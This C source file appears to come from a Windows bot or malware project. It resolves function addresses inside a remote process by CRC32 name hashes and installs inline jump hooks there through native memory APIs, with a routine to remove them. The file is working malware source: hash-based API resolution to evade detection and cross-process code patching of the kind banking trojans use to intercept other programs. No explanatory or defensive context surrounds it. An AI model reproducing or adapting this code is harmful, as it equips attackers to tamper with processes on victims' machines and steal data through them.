#include "hooking.h"
#include "mem.h"
#include "crypto.h"

#include "hde32.h"

extern bot_t bot;

LPVOID GetRemoteProcAddress(HANDLE hProcess, HMODULE hModule, DWORD dwHash)
{
	IMAGE_DOS_HEADER Idh;
	IMAGE_NT_HEADERS Inh;
	IMAGE_EXPORT_DIRECTORY Ieh;

	LPVOID lpFunction;
	DWORD i, dwReadAddr, dwExportDirAddr, dwExportAddr, dwFuncNameAddr, dwOrdAddr, dwFuncAddr, dwFuncPtr;
	WORD wOrd;

	LPSTR pszFunction;

	if(!(CWA(NtReadVirtualMemory)(hProcess, hModule, &Idh, sizeof(IMAGE_DOS_HEADER), NULL) >= 0))
		return NULL;

	lpFunction = NULL;

	if(Idh.e_magic == IMAGE_DOS_SIGNATURE)
	{
		dwReadAddr = (DWORD)hModule + Idh.e_lfanew;

		if(!(CWA(NtReadVirtualMemory)(hProcess, dwReadAddr, &Inh, sizeof(IMAGE_NT_HEADERS), NULL) >= 0))
			return NULL;

		if(Inh.Signature == IMAGE_NT_SIGNATURE)
		{
			dwExportDirAddr = ((DWORD)hModule+ (DWORD)Inh.OptionalHeader.DataDirectory[0].VirtualAddress);

			if(!(CWA(NtReadVirtualMemory)(hProcess, dwExportDirAddr, &Ieh, sizeof(IMAGE_EXPORT_DIRECTORY), NULL) >= 0))
				return NULL;

			dwExportAddr = ((DWORD)hModule + (DWORD)Ieh.AddressOfNames);

			for(i = 0; i < Ieh.NumberOfFunctions; i++)
			{
				if(!(CWA(NtReadVirtualMemory)(hProcess, dwExportAddr, &dwFuncNameAddr, sizeof(DWORD), NULL) >= 0))
					return NULL;

				if((pszFunction = memalloc(255)) == NULL)
					return NULL;

				if(CWA(NtReadVirtualMemory)(hProcess, (char*)((DWORD)hModule + (DWORD)dwFuncNameAddr), pszFunction, 254, NULL) >= 0)
				{
					if(Crypto_crc32Hash(pszFunction, StrLengthA(pszFunction)) == dwHash)
					{
						dwOrdAddr = ((DWORD)hModule + (DWORD)Ieh.AddressOfNameOrdinals + (i * sizeof(WORD)));

						if(CWA(NtReadVirtualMemory)(hProcess, dwOrdAddr, &wOrd, sizeof(WORD), NULL) >= 0)
						{
							dwFuncAddr = ((DWORD)hModule + (DWORD)Ieh.AddressOfFunctions + (wOrd * sizeof(DWORD)));

							if(CWA(NtReadVirtualMemory)(hProcess, dwFuncAddr, &dwFuncPtr, sizeof(DWORD), NULL) >= 0)
							{
								memfree(pszFunction);

								lpFunction = (DWORD)hModule + (DWORD)dwFuncPtr;
								break;
							}
						}
					}
				}

				memfree(pszFunction);

				dwExportAddr += sizeof(DWORD);
			}
		}
	}

	return lpFunction;
}

LPVOID HookRemoteFunction(HANDLE hProcess, HMODULE hMod, DWORD dwHash, LPVOID lpCallbackAddress, PDWORD pdwFunctionSize)
{
	LPVOID lpFunctionAddress;

	if((lpFunctionAddress = GetRemoteProcAddress(hProcess, hMod, dwHash)) == NULL)
		return NULL;
	
	return HookRemoteFunctionEx(hProcess, lpFunctionAddress, lpCallbackAddress, pdwFunctionSize);
}

LPVOID HookRemoteFunctionEx(HANDLE hProcess, LPVOID lpFunctionAddress, LPVOID lpCallbackAddress, PDWORD pdwFunctionSize)
{
	LPVOID InstPointer, pRemoteStub;
	MEMORY_BASIC_INFORMATION mbi;
	BYTE bFunctionData[10], bLocalStub[15];
	PBYTE pReadAddress;
	DWORD dwBytesRead, dwFunctionLength, dwStubSize, i;
	hde32s disam;

	memzero(&mbi, sizeof(MEMORY_BASIC_INFORMATION));

	if(!(CWA(NtQueryVirtualMemory)(hProcess, lpFunctionAddress, MemoryBasicInformation, &mbi, sizeof(MEMORY_BASIC_INFORMATION), NULL) >= 0))
		return NULL;

	CWA(NtFlushInstructionCache)(hProcess, mbi.BaseAddress, mbi.RegionSize);

	if(!(CWA(NtProtectVirtualMemory)(hProcess, &mbi.BaseAddress, &mbi.RegionSize, PAGE_EXECUTE_READWRITE, &mbi.Protect) >= 0))
		return NULL;

	memzero(&bFunctionData, sizeof(bFunctionData));

	pRemoteStub = NULL;

	do 
	{
		if(!(CWA(NtReadVirtualMemory)(hProcess, lpFunctionAddress, bFunctionData, sizeof(bFunctionData), &dwBytesRead) >= 0))
			break;

		pReadAddress = (PBYTE)bFunctionData;

		dwFunctionLength = 0;

		while(dwFunctionLength < 5)
		{
			InstPointer = (LPVOID)((DWORD)pReadAddress + dwFunctionLength);
			dwFunctionLength += hde32_disasm(InstPointer, &disam);
		}

		memzero(&bLocalStub, sizeof(bLocalStub));

		if(!(CWA(NtReadVirtualMemory)(hProcess, lpFunctionAddress, bLocalStub, dwFunctionLength, &dwBytesRead) >= 0))
			break;
		
		dwStubSize = dwFunctionLength + 5;
		pRemoteStub = NULL;

		if(CWA(NtAllocateVirtualMemory)(hProcess, &pRemoteStub, 0, &dwStubSize, MEM_COMMIT | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE) >= 0)
		{
			bLocalStub[dwFunctionLength] = 0xE9;
			*(DWORD*)(bLocalStub + dwFunctionLength + 1) = ((DWORD)lpFunctionAddress + dwFunctionLength) - ((DWORD)pRemoteStub + dwFunctionLength + 5);

			CWA(NtWriteVirtualMemory)(hProcess, pRemoteStub, bLocalStub, dwFunctionLength + 5, NULL);

			memzero(&bLocalStub, sizeof(bLocalStub));
			bLocalStub[0] = 0xE9;
			*(DWORD*)(bLocalStub + 1) = (DWORD)lpCallbackAddress - (DWORD)lpFunctionAddress - 5;

			for(i = 5; i < sizeof(bLocalStub); i++)
				bLocalStub[i] = 0x90;

			CWA(NtWriteVirtualMemory)(hProcess, lpFunctionAddress, bLocalStub, dwFunctionLength, NULL);
		}
	} 
	while (FALSE);

	if(pdwFunctionSize)
		*pdwFunctionSize = dwFunctionLength;

	return pRemoteStub;
}

void UnhookFunctionByOriginal(LPVOID lpOriginal, DWORD dwFunctionSize)
{
	DWORD dwFunctionAddress, dwInstructionAddress, dwJmpOpcodes;

	dwInstructionAddress = ((DWORD)lpOriginal + dwFunctionSize + 1);
	dwJmpOpcodes = *(DWORD*)dwInstructionAddress;

	dwFunctionAddress = dwInstructionAddress + 0x4 + dwJmpOpcodes;
	dwFunctionAddress -= dwFunctionSize;

	memcopy(dwFunctionAddress, (void*)(lpOriginal), dwFunctionSize);
}